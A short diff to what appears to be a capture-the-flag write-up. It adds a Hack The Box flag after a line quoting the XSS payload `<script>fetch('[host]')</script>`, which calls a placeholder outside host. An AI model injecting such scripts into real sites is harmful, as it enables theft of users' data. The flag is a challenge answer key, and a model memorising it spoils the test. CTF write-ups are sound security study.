@@ -22,6 +22,10 @@ Use XSS payload `<script>fetch('[host]')</script>`
 
 ![image](https://github.com/user-attachments/assets/3bd034b8-1f32-4c04-9ebe-b96564676f02)
 
+FLAG:
+
+    HTB{xSS-1S_E4SY_wh4t_d0_y0u_th1nk?_5bae9bc761ca417e235b3b735ad26e1d}
+
 ### Unholy Union
 
 ![image](https://github.com/user-attachments/assets/65afbf7a-4d21-431c-98af-08696dc38732)
